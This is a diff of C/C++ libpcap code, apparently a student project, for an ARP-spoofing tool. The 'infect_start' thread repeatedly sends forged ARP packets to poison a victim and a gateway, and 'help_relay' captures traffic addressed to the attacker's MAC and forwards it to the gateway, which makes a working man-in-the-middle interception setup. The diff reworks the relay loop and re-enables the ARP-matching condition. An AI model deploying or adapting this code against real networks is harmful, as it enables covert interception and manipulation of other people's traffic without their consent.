@@ -52,7 +52,7 @@ struct mix
 void make_mac(const char *str,uint8_t *a);
 void make_t_mac(const u_char *pkt_data, u_int8_t *macsavebox, char *gatewayip); //get mac addr from reply
 void infect_start(pcap_t *ph, uint8_t *packet_data, u_int8_t *gac, u_int8_t *vicmac,u_int8_t *mm);
-void help_relay(pcap_t *a, const u_char *packdata, char *mymac, uint8_t *gatemac);
+void help_relay(pcap_t *a, char *mymac, uint8_t *gatemac);
 
 int main(int argc, char *argv[])
 {
@@ -267,30 +267,12 @@ int main(int argc, char *argv[])
 
         //---------------------------------------------------------------------------------------send relay
 
-        const u_char *relay_data;
-        struct pcap_pkthdr *relay_header;
-        /*                                        <- 여기서 타입을 걸러줄것인지 밑에서걸러줄것인지결정
-        struct ether_hoder *eh;
-        eh = (struct ether_hoder*)&relay_data;
-        uint16_t packet_type=eh->hoder_type;
-        */
-        int s_vic;
-        while((s_vic=pcap_next_ex(ph, &relay_header, &relay_data))>=0)
-        {
-            if(s_vic==1)
-            {
-                std :: thread infect(&infect_start,ph,packet,gatemac,tm,mymac);
-                help_relay(ph,relay_data,mm,gatemac);
-                infect.join();
-            }
-            else if(s_vic==0)
-            {
-                printf("Time out error\n");
-                continue;
-            }
-            else
-                break;  //<-fix at here
-        }
+        std :: thread infect(&infect_start,ph,packet,gatemac,tm,mymac);
+        help_relay(ph,mm,gatemac);
+        infect.join();
+
+
+
 }
 
 //=========================================================================================
@@ -316,7 +298,7 @@ void infect_start(pcap_t *ph, uint8_t *packet_data, u_int8_t *gac, u_int8_t *vic
 {
     struct makearphdr *ar;
     uint8_t ff[6];
-    for(int i=0; i<6; i++)   //<-think
+    for(int i=0; i<6; i++)   //<-think fix
         ff[i]=255;
 
     while(ph!=NULL)
@@ -324,46 +306,58 @@ void infect_start(pcap_t *ph, uint8_t *packet_data, u_int8_t *gac, u_int8_t *vic
             pcap_sendpacket(ph,(u_char*)packet_data,42);
             sleep(3);//recover test
     }
-    /* <-start here!!
+
         if(memcmp(ar->ar_sha,gac,6) + memcmp(ar->ar_tha,vicmac,6)==0 || memcmp(ar->ar_sha,vicmac,6)+ memcmp(ar->ar_tha,gac,6)==0 || memcmp(ar->ar_sha,gac,6)+ memcmp(ar->ar_tha,ff,6)==0)
         {
             pcap_sendpacket(ph,(u_char*)packet_data,42);
         }
-    */
+
 }
 
-void help_relay(pcap_t *a, const u_char *packdata, char *mymac, uint8_t *gatemac) //relay를 할 조건 : mymac 와 패킷의 도착지 가 같아야함 c:mymac  d:myip
+void help_relay(pcap_t *a,char *mymac, uint8_t *gatemac) //relay를 할 조건 : mymac 와 패킷의 도착지 가 같아야함 c:mymac  d:myip
 {
-      struct ether_hoder *eh;
-      eh = (struct ether_hoder*)packdata;
 
-      uint8_t me_m[6];
-      make_mac(mymac,me_m);
-      uint8_t pac_dmac[6];
-      memcpy(pac_dmac,eh->hoder_dhost,6);
-
-      uint16_t packet_type=eh->hoder_type;
-      uint16_t match_type = ntohs(ETHERTYPE_IP);
-
-      uint8_t match_src_mac[6];
-      memcpy(match_src_mac,eh->hoder_shost,6);
-
-
-            if(packet_type==match_type)
+    struct pcap_pkthdr *header;
+    const u_char *packdata;
+    int s_vic;
+    while(true)
+    {
+        while((s_vic=pcap_next_ex(a, &header, &packdata))>=0)
+        {
+            if(s_vic==1)
             {
-              printf("first test success\n");
-              if(memcmp(pac_dmac,me_m,6)==0)
-                  {
-                      printf("go relay data");
-                      while(a!=0)
-                      {
-                            memcpy(eh->hoder_dhost,gatemac,6);
-                            memcpy(eh->hoder_shost,me_m,6);
-                            pcap_sendpacket(a,(u_char*)packdata,BUFSIZ);
-                      }
-                  }
-            }
+                struct ether_hoder *eh;
+                eh = (struct ether_hoder*)packdata;
 
+                uint8_t me_m[6];
+                make_mac(mymac,me_m);
+                uint8_t pac_dmac[6];
+                memcpy(pac_dmac,eh->hoder_dhost,6);
+
+                uint16_t packet_type=eh->hoder_type;
+                uint16_t match_type = ntohs(ETHERTYPE_IP);
+
+
+                if(packet_type==match_type)
+                {
+                     printf("first test success\n");
+                     if(memcmp(pac_dmac,me_m,6)==0)
+                     {
+                           printf("go relay data\n");
+                           memcpy(eh->hoder_dhost,gatemac,6);
+                           memcpy(eh->hoder_shost,me_m,6);
+                           pcap_sendpacket(a,(u_char*)packdata,header->len);
+                           break;
+                      }
+                 }
+            }
+            else if(s_vic<=0)
+            {
+                printf("Time out error\n");
+                continue;
+            }
+        }
+    }
 }
 
 void make_mac(const char *str,uint8_t *a)
